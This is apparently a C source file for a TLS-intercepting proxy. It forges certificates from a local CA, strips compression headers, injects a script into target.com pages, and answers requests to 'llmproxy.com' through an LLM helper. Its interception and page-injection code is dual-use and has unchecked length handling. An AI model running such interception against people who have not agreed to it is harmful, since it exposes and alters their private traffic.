#include <stdio.h>
#include <stdlib.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <curl/curl.h>

#include "proxy.h"
#include "connection_list.h"
#include "injection_script.h"
#include "ssl_utils.h"
#include "llm.h"

#define DEBUG printf

#define DEFAULT_PORT "80"
#define DEFAULT_SSL_PORT "443"
#define BUFFER_SIZE 0x1FFFFFF

#define PROXY_URL "llmproxy.com"

#define TARGET_FLAG 0x1

typedef int (*generic_read)(void *, char *, int);

typedef struct Proxy {
    SOCKET sockfd;
    connection_list cl;
    X509 *ca;
    EVP_PKEY *key;
} *Proxy;

Proxy proxy_init(int port, const char *ca_filename, const char *key_filename)
{
    int optval;
         
    Proxy p = malloc(sizeof(struct Proxy));
    p->sockfd = socket(AF_INET, SOCK_STREAM, 0);
    p->cl = connection_list_init();

    optval = 1;
    setsockopt(p->sockfd, SOL_SOCKET, SO_REUSEADDR, 
	     (const void *)&optval , sizeof(int));

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(p->sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Bind");
        exit(1);
    }

    InitializeSSL();

    p->ca = LoadCertificate(ca_filename);
    p->key = LoadPrivateKey(key_filename);

    listen(p->sockfd, 5);

    DEBUG("Proxy initialized\n");

    return p;
}

void proxy_free(Proxy p)
{
    close(p->sockfd);
    connection_list_free(p->cl);
    X509_free(p->ca);
    EVP_PKEY_free(p->key);
    free(p);
    DEBUG("Proxy freed\n");
}

inline static void make_socket_non_blocking(int sockfd)
{
    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
}

static void accept_new_client(Proxy p)
{
    connection c = init_connection();

    c->fd = accept(p->sockfd, NULL, NULL);
    make_socket_non_blocking(c->fd);
    add_connection(p->cl, c);

    DEBUG("New client connected\n");
}

static void disconnect_connection(Proxy p, connection c)
{
    if (c != NULL && c->peer != NULL) {
        DEBUG("Connection closed %d\n", c->peer->fd);
        remove_connection(p->cl, c->peer);
        connection_free(c->peer);
    } 

    if (c != NULL) {
        DEBUG("Connection closed %d\n", c->fd);
        remove_connection(p->cl, c);
        connection_free(c);
    }
}

static int connect_to_server(const char* server, char *port)
{
    int err;
    int serverfd;
    struct addrinfo *servaddr;
    struct addrinfo hints = {
        .ai_family = AF_INET
    };
    
    getaddrinfo(server, port, &hints, &servaddr);

    serverfd = socket(servaddr->ai_family, 
                      servaddr->ai_socktype, 
                      servaddr->ai_protocol);

    err = connect(serverfd, servaddr->ai_addr, servaddr->ai_addrlen);
    if (err != 0) {
        perror("Server connect");
        return err;
    }

    make_socket_non_blocking(serverfd);

    DEBUG("Connected to server: %s:%s\n", server, port);

    freeaddrinfo(servaddr);
    
    return serverfd;
}

static void ssl_error(Proxy p, connection c)
{
    disconnect_connection(p, c);
}

static void init_SSL_connection(Proxy p, connection c, char *hostname)
{
    SSL *server_ssl, *client_ssl;

    if (c->using_ssl)
        return;

    DEBUG("Initializing SSL connection\n");
    if (c->role == 0) {

        if(c->peer != NULL) {
            server_ssl = CreateServerSSL(hostname, c->peer->fd);

            while (-1 == SSL_connect(server_ssl))
            {
                fd_set fds;
                FD_ZERO(&fds);
                FD_SET(c->peer->fd, &fds);

                ERR_print_errors_fp(stdout);
                DEBUG("SSL_error: %d\n", SSL_get_error(server_ssl, -1));

                switch (SSL_get_error(server_ssl, -1))
                {
                    case SSL_ERROR_WANT_READ:
                        select(c->peer->fd + 1, &fds, NULL, NULL, NULL);
                        break;
                    case SSL_ERROR_WANT_WRITE:
                        select(c->peer->fd + 1, NULL, &fds, NULL, NULL);
                        break;
                    default:
                        SSL_free(server_ssl);
                        ssl_error(p, c);
                        return;
                }
            }

            c->peer->ssl = server_ssl;
            c->peer->using_ssl = 1;
        }

        X509 *cert = GenerateCertificate(hostname, p->ca, p->key);
        client_ssl = CreateClientSSL(cert, p->key, c->fd);

        DEBUG("SSL connection initialized for server\n");

        while (-1 == SSL_accept(client_ssl))
        {
            fd_set fds;
            FD_ZERO(&fds);
            FD_SET(c->fd, &fds);

            ERR_print_errors_fp(stdout);

            switch (SSL_get_error(client_ssl, -1))
            {
                case SSL_ERROR_WANT_READ:
                    select(c->fd + 1, &fds, NULL, NULL, NULL);
                    break;
                case SSL_ERROR_WANT_WRITE:
                    select(c->fd + 1, NULL, &fds, NULL, NULL);
                    break;
                default:
                    SSL_free(client_ssl);
                    X509_free(cert);
                    ssl_error(p, c);
                    return;
            }
        }

        c->ssl = client_ssl;
        c->using_ssl = 1;

        DEBUG("SSL connection initialized for client\n");

        X509_free(cert);
    }
}

static int process_target_product_page(struct HTTPMessage *message)
{
    extern const char *injection_script;

    char *html_end = strcasestr(message->data, "</html>");
    if (html_end != NULL) {
        int script_length = strlen(injection_script);
        int new_length = message->length + script_length;

        if (new_length > message->size) {
            expand_data(message);
        }

        memmove(html_end + script_length, html_end, message->length - (html_end - message->data));
        memcpy(html_end, injection_script, script_length);
        message->length = new_length;
        message->data[message->length] = '\0';

        char *header_end = strstr(message->data, "\r\n\r\n");
        if (header_end) {
            int body_length = message->length - (header_end - message->data) - 4;
            char content_length_str[20];
            sprintf(content_length_str, "%d", body_length);
            set_field(message, "Content-Length", content_length_str);
        }        
    }

    return 0;
}

static int process_LLM_request(Proxy p, connection c, char *method)
{
    int request_length, response_length;
    char *request = malloc(BUFFER_SIZE);
    char *request_start;
    char buffer[1024];
    char response_header[1024];
    char *response = malloc(BUFFER_SIZE);

    if (strcmp(method, "CONNECT") == 0) {
        strncpy(response, "HTTP/1.1 200 OK\r\n\r\n", 22);
        write_to_connection(c, response, strlen(response));
        init_SSL_connection(p, c, PROXY_URL);
    } else if (strcmp(method, "OPTIONS") == 0) {
        response_length = get_OPTIONS_response(response);
        write_to_connection(c, response, strlen(response));
    } else if (strcmp(method, "POST") == 0) {
        get_field(c->message.data, "Content-Length: ", buffer, 1024);
        request_length = atoi(buffer);

        request_start = strstr(c->message.data, "\r\n\r\n") + 4;
        strncpy(request, request_start, request_length);

        process_POST_request(request, response);
        
        snprintf(response_header, sizeof(response_header),
             "HTTP/1.1 200 OK\r\n"
             "Content-Type: application/json\r\n"
             "Content-Length: %zu\r\n"
             "Access-Control-Allow-Origin: https://www.target.com\r\n"
             "Access-Control-Allow-Methods: POST, OPTIONS\r\n"
             "Access-Control-Allow-Headers: x-api-key, Content-Type\r\n"
             "Access-Control-Max-Age: 86400\r\n"
             "Vary: Origin\r\n"
             "\r\n", strlen(response));

        write_to_connection(c, response_header, strlen(response_header));
        write_to_connection(c, response, strlen(response));
    }

    free(request);
    free(response);
}

static int process_message(Proxy p, connection c)
{
    char method[16];
    char hostname_and_port[262];
    char hostname[256];
    char port[16] = {0};
    char CONNECT_response[] = "HTTP/1.1 200 OK\r\n\r\n";
    char buffer[256] = {0};
    get_method(c->message.data, method, 16);

    if (strncmp(method, "GET", 3) == 0) {
        char *accept_encoding = strcasestr(c->message.data, "Accept-Encoding:");
        if (c->role == 0 && accept_encoding != NULL) {
            char *end = strstr(accept_encoding, "\r\n");
            if (end != NULL) {
                memmove(accept_encoding, end + 2, c->message.length - (end + 2 - c->message.data));
                c->message.length -= (end + 2 - accept_encoding);
            }
        }

        if (strstr(c->message.data, "Host: target.com") || strstr(c->message.data, "Host: www.target.com"))
            c->flags |= TARGET_FLAG;
    }

    if (c->role == 1 && (c->peer->flags & TARGET_FLAG)) {
        process_target_product_page(&c->message);
        c->peer->flags &= ~TARGET_FLAG;
    }

    if (c->role == 0 && (strstr(c->message.data, "Host: llmproxy.com") != NULL)) {
        process_LLM_request(p, c, method);
        return 0;
    }

    if (c->peer == NULL) {
        get_field(c->message.data, "Host: ", hostname_and_port, 256);
        sscanf(hostname_and_port, "%255[^:]:%15s", hostname, port);

        if (port[0] == '\0') {
            if (strcmp(method, "CONNECT") == 0)
                strcpy(port, DEFAULT_SSL_PORT);
            else
                strcpy(port, DEFAULT_PORT);
        }

        int serverfd = connect_to_server(hostname, port);
        if (serverfd < 0) {
            disconnect_connection(p, c);
            return -1;
        }
        connection server = init_connection();
        server->fd = serverfd;
        c->peer = server;
        server->peer = c;
        server->role = 1;
        add_connection(p->cl, server);

        if (strcmp(method, "CONNECT") == 0){
            DEBUG("CONNECT request\n");
            write_to_connection(c, CONNECT_response, strlen(CONNECT_response));
            init_SSL_connection(p, c, hostname);
        } else {
            write_to_connection(server, c->message.data, c->message.length);
        }
    } else {
        write_to_connection(c->peer, c->message.data, c->message.length);
    }
}

int proxy_run(Proxy p) 
{
    fd_set fds;
    int max_fd;
    struct timeval timeout = {0, 0};

    char *buffer = malloc(BUFFER_SIZE);
    int bytes_read;

    while(1) {
        max_fd = get_max_fd(p->cl);
        max_fd = max_fd > p->sockfd ? max_fd : p->sockfd;
        fds = get_fd_set(p->cl);
        FD_SET(p->sockfd, &fds);

        select(max_fd + 1, &fds, NULL, NULL, NULL);

        DEBUG("Select returned\n");

        if (FD_ISSET(p->sockfd, &fds))
            accept_new_client(p);

        for (int sock = 0; sock <= max_fd; sock++) {
            if (sock == p->sockfd)
                continue;
            
            if (FD_ISSET(sock, &fds)) {
                DEBUG("Data available on socket %d\n", sock);

                connection c = get_connection(p->cl, sock);

                if (c == NULL) {
                    close(sock);
                    continue;
                }

                bytes_read = read_from_connection(c, 
                                                  c->message.data + c->message.length, 
                                                  c->message.size - c->message.length);
                
                if (bytes_read < 0) {
                    disconnect_connection(p, c);
                    continue;
                }

                c->message.length += bytes_read;

                if (c->message.length == c->message.size) {
                    expand_data(&c->message);
                }

                if ((c->peer != NULL) && (c->peer->flags & TARGET_FLAG)) {
                    if (is_complete(&c->message)) {
                        process_message(p, c);
                        clear_message(&c->message);
                    }
                } else {
                    process_message(p, c);
                    clear_message(&c->message);
                }
            }
        }
    }
}